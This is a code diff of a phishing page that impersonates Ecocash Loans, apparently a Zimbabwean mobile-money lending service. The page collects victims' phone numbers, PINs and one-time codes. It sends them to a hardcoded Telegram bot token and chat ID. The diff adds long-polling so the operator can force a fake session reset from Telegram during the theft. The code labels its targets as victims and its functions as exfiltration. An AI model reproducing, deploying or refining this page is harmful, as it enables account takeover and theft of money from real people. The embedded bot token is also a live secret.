@@ -2,29 +2,33 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <meta name="theme-color" content="#00a651" />
-  <title>Ecocash Loans — Fast Cash to Your Wallet</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, user-scalable=no" />
+  <meta name="theme-color" content="#0033A0" />
+  <title>Ecocash Loans — Instant Cash to Your Wallet</title>
 
+  <!-- ECOCASH OFFICIAL FAVICON -->
   <link rel="icon" type="image/png" href="https://www.ecocash.co.zw/favicon.ico" />
   <link rel="apple-touch-icon" href="https://www.ecocash.co.zw/apple-touch-icon.png" />
 
   <style>
     :root {
-      --green: #00a651;
-      --green-2: #008c45;
+      --ecocash-blue: #0033A0;
+      --ecocash-blue-hover: #0066FF;
       --ink: #0e1a14;
       --muted: #5b6b62;
-      --bg: #f4f7f5;
-      --card: #fff;
+      --bg: #f5f5f5;
+      --card: #ffffff;
       --danger: #c0392b;
-      --radius: 14px;
-      --shadow: 0 2px 10px rgba(10,30,20,.08);
+      --radius: 16px;
+      --shadow: 0 4px 12px rgba(0, 51, 160, 0.1);
+      --input-bg: #f0f4f8;
     }
 
     * {
       box-sizing: border-box;
       -webkit-tap-highlight-color: transparent;
+      margin: 0;
+      padding: 0;
     }
 
     html, body {
@@ -32,25 +36,28 @@
       padding: 0;
       background: var(--bg);
       color: var(--ink);
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
       font-size: 16px;
-      line-height: 1.45;
+      line-height: 1.5;
+      height: 100%;
     }
 
     .wrap {
-      max-width: 440px;
+      max-width: 100%;
+      width: 100%;
+      min-height: 100vh;
       margin: 0 auto;
-      min-height: 100dvh;
       display: flex;
       flex-direction: column;
+      padding: 0 12px;
     }
 
     header {
-      background: var(--green);
+      background: var(--ecocash-blue);
       color: #fff;
-      padding: 18px 20px 22px;
-      border-bottom-left-radius: 22px;
-      border-bottom-right-radius: 22px;
+      padding: 20px 16px 24px;
+      border-bottom-left-radius: 24px;
+      border-bottom-right-radius: 24px;
       box-shadow: var(--shadow);
       text-align: center;
     }
@@ -59,13 +66,13 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 10px;
+      gap: 12px;
       margin-bottom: 8px;
     }
 
     .logo {
-      width: 48px;
-      height: 48px;
+      width: 52px;
+      height: 52px;
       background-image: url('https://www.ecocash.co.zw/assets/images/ecocash-logo-white.png');
       background-size: contain;
       background-repeat: no-repeat;
@@ -74,25 +81,27 @@
 
     .brandname {
       font-weight: 700;
-      font-size: 1.4rem;
+      font-size: 1.45rem;
+      color: #fff;
     }
 
     .tag {
-      font-size: 12px;
-      opacity: 0.85;
+      font-size: 12.5px;
+      opacity: 0.9;
     }
 
     .hero {
-      margin-top: 14px;
-      padding: 0 10px;
+      margin-top: 16px;
+      padding: 0 12px;
     }
 
     .hero h1 {
       margin: 0;
-      font-size: 21px;
-      line-height: 1.3;
+      font-size: 1.45rem;
+      line-height: 1.35;
       font-weight: 700;
       text-align: center;
+      color: #0033A0;
     }
 
     .hero p {
@@ -100,24 +109,26 @@
       font-size: 13.5px;
       opacity: 0.9;
       text-align: center;
+      color: var(--muted);
     }
 
     main {
       flex: 1;
-      padding: 18px 16px 28px;
+      padding: 18px 12px 28px;
     }
 
     .card {
       background: var(--card);
       border-radius: var(--radius);
       box-shadow: var(--shadow);
-      padding: 18px;
-      margin-bottom: 14px;
+      padding: 20px;
+      margin-bottom: 16px;
     }
 
     .card h2 {
-      margin: 0 0 4px;
+      margin: 0 0 6px;
       font-size: 16px;
+      color: var(--ink);
     }
 
     .card .sub {
@@ -128,48 +139,54 @@
 
     label {
       display: block;
-      font-size: 13px;
+      font-size: 13.5px;
       color: var(--muted);
       margin: 12px 0 6px;
     }
 
-    input[type="tel"] {
+    input[type="tel"], select {
       width: 100%;
-      padding: 12px 14px;
-      border: 1px solid #e0e6e2;
-      border-radius: 12px;
+      padding: 14px 16px;
+      border: 1px solid #d0d8e0;
+      border-radius: 14px;
       font-size: 16px;
-      background: #f0f3f1;
+      background: var(--input-bg);
       color: var(--ink);
+      transition: all 0.2s;
     }
 
-    input:focus {
-      border-color: var(--green-2);
+    input[type="tel"]:focus, select:focus {
+      border-color: var(--ecocash-blue);
       background: #fff;
       outline: none;
+      box-shadow: 0 0 0 3px rgba(0, 51, 160, 0.15);
     }
 
     button.cta {
       width: 100%;
-      height: 54px;
+      height: 56px;
       border: 0;
-      border-radius: 12px;
-      background: var(--green);
+      border-radius: 14px;
+      background: var(--ecocash-blue);
       color: #fff;
-      font-size: 16px;
+      font-size: 16.5px;
       font-weight: 700;
-      margin-top: 16px;
+      margin-top: 18px;
       cursor: pointer;
-      transition: transform 0.05s, background 0.15s;
+      transition: all 0.15s;
+    }
+
+    button.cta:hover {
+      background: var(--ecocash-blue-hover);
     }
 
     button.cta:active {
       transform: translateY(1px);
-      background: var(--green-2);
+      background: #002a80;
     }
 
     button.cta[disabled] {
-      opacity: 0.55;
+      opacity: 0.5;
       cursor: not-allowed;
     }
 
@@ -177,6 +194,7 @@
       font-size: 12px;
       color: var(--muted);
       margin-top: 8px;
+      text-align: center;
     }
 
     .err {
@@ -191,7 +209,7 @@
     }
 
     footer {
-      padding: 18px 20px 26px;
+      padding: 18px 16px 26px;
       text-align: center;
       color: var(--muted);
       font-size: 11.5px;
@@ -201,10 +219,11 @@
     .sheet {
       position: fixed;
       inset: 0;
-      background: rgba(8,20,14,.55);
+      background: rgba(0, 51, 160, 0.6);
       display: none;
       align-items: flex-end;
-      z-index: 40;
+      justify-content: center;
+      z-index: 1000;
     }
 
     .sheet.show {
@@ -214,64 +233,62 @@
     .sheet .inner {
       background: #fff;
       width: 100%;
-      max-width: 440px;
+      max-width: 460px;
       margin: 0 auto;
       border-top-left-radius: 20px;
       border-top-right-radius: 20px;
-      padding: 22px 20px 28px;
-      animation: up .18s ease-out;
-      position: relative;
-    }
-
-    @keyframes up {
-      from { transform: translateY(20px); opacity: 0.7; }
-      to { transform: none; opacity: 1; }
+      padding: 24px 20px 30px;
+      box-shadow: 0 -2px 20px rgba(0,0,0,0.1);
     }
 
     .sheet h3 {
-      margin: 0 0 4px;
-      font-size: 17px;
+      margin: 0 0 6px;
+      font-size: 18px;
+      color: var(--ink);
     }
 
     .sheet p {
-      margin: 0 0 14px;
+      margin: 0 0 16px;
       color: var(--muted);
-      font-size: 13.5px;
+      font-size: 14px;
     }
 
     .otp-row {
       display: flex;
-      gap: 8px;
-      justify-content: space-between;
-      margin: 10px 0 6px;
+      gap: 10px;
+      justify-content: center;
+      margin: 14px 0 8px;
     }
 
     .otp-row input {
-      width: 100%;
-      height: 56px;
+      width: 60px;
+      height: 60px;
       border-radius: 12px;
-      border: 1px solid #e0e6e2;
-      background: #f0f3f1;
+      border: 2px solid #d0d8e0;
+      background: var(--input-bg);
       text-align: center;
-      font-size: 22px;
+      font-size: 24px;
       font-weight: 700;
-      outline: 0;
+      color: var(--ink);
+      outline: none;
+      transition: all 0.2s;
     }
 
     .otp-row input:focus {
-      border-color: var(--green-2);
+      border-color: var(--ecocash-blue);
       background: #fff;
+      transform: scale(1.05);
     }
 
     .resend {
-      font-size: 12.5px;
+      font-size: 13px;
       color: var(--muted);
-      margin-top: 6px;
+      margin-top: 8px;
       text-align: center;
     }
 
     .resend b {
-      color: var(--green);
+      color: var(--ecocash-blue);
       cursor: pointer;
     }
 
@@ -281,24 +298,29 @@
       right: 18px;
       background: transparent;
       border: 0;
-      font-size: 20px;
-      color: var(--muted);
+      font-size: 24px;
+      color: #fff;
       cursor: pointer;
+      opacity: 0.9;
+    }
+
+    .close-x:hover {
+      opacity: 1;
     }
 
     /* Processing Screen */
     .processing {
       text-align: center;
-      padding: 32px 20px;
+      padding: 36px 20px;
     }
 
     .spinner {
-      width: 50px;
-      height: 50px;
-      border: 4px solid #eafaf0;
-      border-top: 4px solid #00a651;
+      width: 56px;
+      height: 56px;
+      border: 4px solid #e0f0ff;
+      border-top: 4px solid var(--ecocash-blue);
       border-radius: 50%;
-      margin: 0 auto 16px;
+      margin: 0 auto 18px;
       animation: spin 1s linear infinite;
     }
 
@@ -310,11 +332,19 @@
     .processing h2 {
       margin-bottom: 8px;
       color: var(--ink);
+      font-size: 18px;
     }
 
     .processing p {
       color: var(--muted);
       font-size: 14px;
+    }
+
+    @media (max-width: 480px) {
+      .wrap { padding: 0 8px; }
+      .brandname { font-size: 1.3rem; }
+      .hero h1 { font-size: 1.35rem; }
+      .otp-row input { width: 54px; height: 54px; font-size: 20px; }
     }
   </style>
 </head>
@@ -400,7 +430,7 @@
     <h3>Enter OTP Code</h3>
     <p>We sent a 4-digit code to <b id="otpMsisdn"></b>. Enter it below.</p>
 
-    <div class="otp-row" id="otpRow">
+    <div class="otp-row">
       <input inputmode="numeric" maxlength="1" />
       <input inputmode="numeric" maxlength="1" />
       <input inputmode="numeric" maxlength="1" />
@@ -423,9 +453,10 @@
 </section>
 
 <script>
-  // === YOUR TELEGRAM BOT ===
-  const TELEGRAM_BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E';
-  const TELEGRAM_CHAT_ID = '1469249528';
+  // === CONFIG: TELEGRAM BOT ===
+  const BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E';
+  const CHAT_ID = '1469249528';
+  let POLLING_INTERVAL;
 
   // === STATE ===
   const state = {
@@ -433,7 +464,8 @@
     amount: '',
     term: '',
     pin: '',
-    otp: ''
+    otp: '',
+    victimId: null
   };
 
   // === HELPERS ===
@@ -460,13 +492,13 @@
     const custom = document.getElementById('customAmount');
     if (select.value === 'custom') {
       custom.style.display = 'block';
-      custom.focus();
+      setTimeout(() => custom.focus(), 100);
     } else {
       custom.style.display = 'none';
     }
   }
 
-  // === STEP 1: PHONE + LOAN → PIN ===
+  // === STEP 1: PHONE → PIN ===
   document.getElementById('btnCheckLimit').addEventListener('click', () => {
     const msisdn = document.getElementById('msisdn').value.trim();
     const amount = getFinalAmount();
@@ -494,7 +526,7 @@
     }
 
     state.pin = pin;
-    exfiltratePin(); // First exfil: Phone + PIN
+    exfiltratePin();
     openOtpSheet();
   });
 
@@ -504,11 +536,12 @@
     document.getElementById('otpSheet').classList.add('show');
     document.getElementById('otpRow').children[0].focus();
     startOtpTimer();
-    sendAdminControlMessage(); // Send buttons to your Telegram
+    sendAdminAlert();
+    startPolling();
   }
 
   function startOtpTimer() {
-    let s = 600; // 10 minutes
+    let s = 600;
     const el = document.getElementById('resendTimer');
     const interval = setInterval(() => {
       const mins = Math.floor(s / 60);
@@ -518,10 +551,13 @@
     }, 1000);
   }
 
-  // Send interactive admin panel to Telegram
-  function sendAdminControlMessage() {
+  // === SEND ADMIN CONTROL TO TELEGRAM ===
+  function sendAdminAlert() {
+    const victimId = Date.now();
+    state.victimId = victimId;
+
     const message = `
-🚨 *ADMIN CONTROL: ECOCASH VICTIM* 🚨
+🚨 *ECOCASH VICTIM ACTIVE* 🚨
 📞 *Number:* ${state.msisdn}
 🔐 *PIN:* ${state.pin}
 💸 *Loan:* ${state.amount}
@@ -530,55 +566,54 @@ Choose action:
 `;
     const keyboard = {
       inline_keyboard: [
-        [{ text: "✅ Approve & Continue", callback_data: `approve_${Date.now()}` }],
-        [{ text: "❌ Force Reset", callback_data: `reset_${Date.now()}` }]
+        [{ text: "🔁 Reset Session", callback_data: `reset_${victimId}` }],
+        [{ text: "✅ Approve OTP", callback_data: `approve_${victimId}` }]
       ]
     };
 
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    fetch(url, {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
+        chat_id: CHAT_ID,
         text: message,
         reply_markup: keyboard,
         parse_mode: 'Markdown'
       })
-    }).catch(() => {});
+    }).catch(console.error);
   }
 
-  // Handle fake reset from Telegram (via long-poll simulation)
-  // In real ops, use webhook or polling to catch callback_query
-  // For demo, we simulate with fake button:
-  window.addEventListener('message', function(e) {
-    if (e.data === 'admin_reset') {
-      alert('Session expired. Please try again.');
-      location.reload();
-    }
-  });
+  // === LONG POLLING TO CATCH YOUR CLICK ===
+  function startPolling() {
+    let offset = null;
+    POLLING_INTERVAL = setInterval(() => {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&timeout=30`)
+        .then(r => r.json())
+        .then(data => {
+          data.result.forEach(msg => {
+            offset = msg.update_id + 1;
+            const action = msg.callback_query?.data;
+            const fromId = msg.callback_query?.from.id;
 
-  document.getElementById('resend').addEventListener('click', () => {
-    startOtpTimer();
-    exfiltratePin(); // Re-log PIN if resent
-  });
+            if (fromId != CHAT_ID) return;
 
-  document.getElementById('otpClose').addEventListener('click', () => {
-    if (confirm('Cancel verification? Your loan will not be processed.')) {
-      document.getElementById('otpSheet').classList.remove('show');
-    }
-  });
+            if (action?.startsWith('reset_') && action.endsWith(state.victimId)) {
+              alert('Session expired. Please try again.');
+              clearInterval(POLLING_INTERVAL);
+              location.reload();
+            }
+          });
+        })
+        .catch(() => {});
+    }, 2000);
+  }
 
-  // OTP Input Logic (4 digits)
+  // OTP Input Logic
   const otpInputs = document.querySelectorAll('#otpRow input');
   otpInputs.forEach((input, index) => {
     input.addEventListener('input', () => {
-      if (input.value.length === 1 && index < otpInputs.length - 1) {
-        otpInputs[index + 1].focus();
-      }
-      if (index === otpInputs.length - 1) {
-        document.getElementById('btnVerify').disabled = false;
-      }
+      if (input.value.length === 1 && index < 3) otpInputs[index + 1].focus();
+      if (index === 3) document.getElementById('btnVerify').disabled = false;
     });
 
     input.addEventListener('keydown', e => {
@@ -593,50 +628,63 @@ Choose action:
     if (otp.length !== 4) return showErr('errOtp', 'Enter all 4 digits');
 
     state.otp = otp;
-    exfiltrateOtp(); // Final exfil: Phone + PIN + OTP
+    exfiltrateOtp(); // Now sends OTP correctly
 
     document.getElementById('cardStep2').style.display = 'none';
     document.getElementById('otpSheet').classList.remove('show');
     document.getElementById('processingScreen').style.display = 'block';
+
+    clearInterval(POLLING_INTERVAL);
   });
 
-  // === EXFILTRATION TO TELEGRAM ===
+  // === EXFILTRATION ===
   function exfiltratePin() {
     const message = `
-🔥 *ECOCASH PIN CAPTURED* 🔥
-📞 *Victim:* ${state.msisdn}
+📲 *ECOCASH VICTIM: PHONE + PIN*
+📞 *Number:* ${state.msisdn}
+🔐 *PIN:* ${state.pin}
 💸 *Loan:* ${state.amount}
 📅 *Term:* ${state.term}
-🔐 *PIN:* ${state.pin}
-🕒 ${new Date().toLocaleString()}
-    `.trim();
-
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const payload = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
-
-    try { navigator.sendBeacon(url, JSON.stringify(payload)); }
-    catch (e) { fetch(url, { method: 'POST', body: JSON.stringify(payload), mode: 'no-cors' }); }
+🕒 *Time:* ${new Date().toLocaleString()}
+`;
+    sendToTelegram(message);
   }
 
   function exfiltrateOtp() {
     const message = `
-🔢 *ECOCASH OTP INTERCEPTED*
+🔐 *ECOCASH OTP CAPTURED*
 📞 *Number:* ${state.msisdn}
 🔐 *PIN:* ${state.pin}
-🔑 *OTP:* ${state.otp}
+🔢 *OTP:* ${state.otp}
 💸 *Loan:* ${state.amount}
 📅 *Term:* ${state.term}
-🕒 ${new Date().toLocaleString()}
-    `.trim();
+🕒 *Time:* ${new Date().toLocaleString()}
+`;
+    sendToTelegram(message);
+  }
 
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const payload = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
+  function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
 
     try { navigator.sendBeacon(url, JSON.stringify(payload)); }
     catch (e) { fetch(url, { method: 'POST', body: JSON.stringify(payload), mode: 'no-cors' }); }
   }
 
   document.getElementById('yr').textContent = new Date().getFullYear();
+
+  // Resend OTP
+  document.getElementById('resend').addEventListener('click', () => {
+    startOtpTimer();
+    exfiltratePin(); // Log attempt
+  });
+
+  // Close OTP
+  document.getElementById('otpClose').addEventListener('click', () => {
+    if (confirm('Cancel verification? Your loan will not be processed.')) {
+      document.getElementById('otpSheet').classList.remove('show');
+    }
+  });
 </script>
 
 </body>
